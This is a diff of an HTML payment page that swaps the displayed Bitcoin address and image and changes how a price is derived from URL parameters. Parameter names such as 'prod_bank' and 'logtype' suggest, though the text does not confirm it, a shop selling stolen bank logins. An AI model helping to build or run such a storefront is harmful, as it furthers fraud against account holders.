@@ -327,8 +327,8 @@
                             <span id="the-other-one"></span> 
                               payment...
                         </strong>
-                        <input type="text" style=" color: black; font-size: 1.1rem; font-weight: 700; border-radius: 3px;border: 2px solid #36a3f5; font-family: 'Montserrat',  sans-serif;" class="form-control" value="1AMjPsZQvqeAfnEjfk17fEUZc6rZuM9Ccp" onclick="this.select();">
-                        <img src="images/address.jpeg" style="border-radius: 5px;"/>
+                        <input type="text" style=" color: black; font-size: 1.1rem; font-weight: 700; border-radius: 3px;border: 2px solid #36a3f5; font-family: 'Montserrat',  sans-serif;" class="form-control" value="19y6HG31nUcsiQWmp5xgtzM7JECXLLvZRU" onclick="this.select();">
+                        <img src="images/download.png" style="border-radius: 5px;"/>
                     </p>
                 </div>
 
@@ -338,7 +338,7 @@
                 window.addEventListener('load', () => {
                     const params = (new URL(document.location)).searchParams;
                     const name = params.get('prod_id');
-                    const surname = ( params.get('prod_id') / 58140).toFixed(6);
+                    const surname = ( params.get('prod_id') / 58140).toFixed(4);
                     const bank = params.get('prod_bank');
                     const logtype = params.get('prod_type');
                     const logtype1 = params.get('prod_type1');
